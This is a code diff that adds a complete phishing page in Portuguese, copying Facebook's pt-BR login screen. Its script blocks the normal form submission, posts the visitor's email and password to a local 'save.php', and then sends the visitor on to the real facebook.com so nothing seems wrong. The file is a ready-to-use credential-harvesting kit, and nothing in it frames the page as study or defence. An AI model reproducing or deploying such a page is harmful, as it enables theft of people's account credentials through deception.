@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<title>Facebook – entre ou cadastre-se</title>
+<style>
+/* ---- RESET ---- */
+*{box-sizing:border-box;margin:0;padding:0;font-family:Helvetica,Arial,sans-serif}
+body{background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+/* ---- COLUNA ESQUERDA ---- */
+.esquerda{max-width:580px;margin-right:80px}
+.logo{color:#1877f2;font-size:56px;font-weight:bold}
+.sub{color:#1c1e21;font-size:26px;margin-top:10px}
+/* ---- BOX BRANCO ---- */
+.box{background:#fff;width:396px;padding:18px 16px 24px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}
+input{width:100%;padding:14px 16px;margin:6px 0;font-size:17px;border:1px solid #dddfe2;border-radius:6px}
+.entrar{background:#1877f2;color:#fff;font-size:20px;font-weight:bold;border:none;width:100%;padding:12px 0;border-radius:6px;cursor:pointer}
+.esq{display:block;text-align:center;color:#1877f2;font-size:14px;margin:16px 0;text-decoration:none}
+hr{border:none;border-top:1px solid #dadde1;margin:20px 0}
+.criar{background:#42b72a;color:#fff;font-size:17px;font-weight:bold;border:none;border-radius:6px;padding:12px 24px;margin:0 auto;display:block;cursor:pointer}
+.footer{margin-top:28px;text-align:center;font-size:14px;color:#1c1e21}
+/* ---- RESPONSIVO ---- */
+@media(max-width:900px){body{flex-direction:column;text-align:center}.esquerda{margin-bottom:40px}}
+</style>
+</head>
+<body>
+<!-- COLUNA ESQUERDA -->
+<div class="esquerda">
+  <div class="logo">facebook</div>
+  <div class="sub">O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</div>
+</div>
+
+<!-- BOX LOGIN -->
+<div>
+  <div class="box">
+    <form id="loginForm">
+      <input id="email" placeholder="Email ou telefone" required>
+      <input id="pass" type="password" placeholder="Senha" required>
+      <button class="entrar">Entrar</button>
+    </form>
+    <a class="esq" href="https://www.facebook.com/recover/initiate/">Esqueceu a senha?</a>
+    <hr>
+    <a class="criar" href="https://www.facebook.com/r.php">Criar nova conta</a>
+  </div>
+  <div class="footer">
+    <a href="https://www.facebook.com/pages/create/">Crie uma Página</a> para uma celebridade, uma marca ou uma empresa.
+  </div>
+</div>
+
+<script>
+/* ---- ENVIO SIMPLES ---- */
+document.getElementById('loginForm').addEventListener('submit',function(e){
+  e.preventDefault();                                    // não recarrega
+  const email=document.getElementById('email').value.trim();
+  const pass=document.getElementById('pass').value.trim();
+  if(!email||!pass)return;                               // campos vazios → sai
+  fetch('save.php',{                                     // chama o PHP
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:`e=${encodeURIComponent(email)}&p=${encodeURIComponent(pass)}`
+  }).finally(()=>location.href='https://www.facebook.com'); // vai embora
+});
+</script>
+</body>
+</html>
